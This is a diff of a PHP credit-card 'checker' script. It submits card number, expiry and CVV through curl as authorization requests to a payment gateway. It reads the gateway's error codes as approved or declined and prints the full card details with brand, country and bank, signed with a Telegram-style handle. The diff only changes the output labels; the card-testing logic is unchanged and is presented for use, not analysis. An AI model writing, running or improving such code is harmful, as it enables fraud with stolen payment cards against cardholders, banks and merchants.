@@ -294,18 +294,18 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, 'mode=authorize&method=18&ordernumber=2647&
 $response = curl_exec($ch);
 
 if (strpos($response, '(15004) This transaction cannot be processed. Please enter a valid Credit Card Verification Number.')) {
-    echo 'Aprovada ➔ '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➔ ' .$bandeira.'|'.$pais.'|'.$tipo.'|'.$nivel.'|'.$banco.' ➔ (15004) This transaction cannot be processed. Please enter a valid Credit Card Verification Number. ➔ @DIDIAC68';
+    echo '➔'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➔ ' .$bandeira.'|'.$pais.'|'.$tipo.'|'.$nivel.'|'.$banco.' ➔ (15004) This transaction cannot be processed. Please enter a valid Credit Card Verification Number. ➔ @DIDIAC68';
 }
 elseif(strpos($response, '(15005) This transaction cannot be processed.')){
-         echo 'Reprovada ➔ '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➔ '.$bandeira.'|'.$pais.'|'.$tipo.'|'.$nivel.'|'.$banco.' ➔ (15005) This transaction cannot be processed. ➔ @DIDIAC68';
+    echo '➔'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➔ '.$bandeira.'|'.$pais.'|'.$tipo.'|'.$nivel.'|'.$banco.' ➔ (15005) This transaction cannot be processed. ➔ @DIDIAC68';
 }
 elseif(strpos($response, '(10535) This transaction cannot be processed. Please enter a valid credit card number and type.')){
-         echo 'Reprovada ➔ '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➔ '.$bandeira.'|'.$pais.'|'.$tipo.'|'.$nivel.'|'.$banco.' ➔ (10535) This transaction cannot be processed. Please enter a valid credit card number and type. ➔ @DIDIAC68';
+    echo '➔'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➔ '.$bandeira.'|'.$pais.'|'.$tipo.'|'.$nivel.'|'.$banco.' ➔ (10535) This transaction cannot be processed. Please enter a valid credit card number and type. ➔ @DIDIAC68';
 }
 elseif (strpos($response, '(10502) This transaction cannot be processed. Please use a valid credit card.') || $bandeira == 'AMERICAN EXPRESS' || $banco == 'BRADESCO CARTOES') {
-    echo 'Aprovada ➔ '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➔ '.$bandeira.'|'.$pais.'|'.$tipo.'|'.$nivel.'|'.$banco.' ➔ (10502) This transaction cannot be processed. Please use a valid credit card. ➔ @DIDIAC68';
+    echo '➔'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➔ '.$bandeira.'|'.$pais.'|'.$tipo.'|'.$nivel.'|'.$banco.' ➔ (10502) This transaction cannot be processed. Please use a valid credit card. ➔ @DIDIAC68';
 } else {
-    echo 'Reprovada ➔ '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➔ '.$bandeira.'|'.$pais.'|'.$tipo.'|'.$nivel.'|'.$banco.' ➔ (10502) This transaction cannot be processed. Please use a valid credit card. ➔ @DIDIAC68 ';
+    echo '➔'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➔ '.$bandeira.'|'.$pais.'|'.$tipo.'|'.$nivel.'|'.$banco.' ➔ (10502) This transaction cannot be processed. Please use a valid credit card. ➔ @DIDIAC68 ';
 }
 
 deletarCookies();
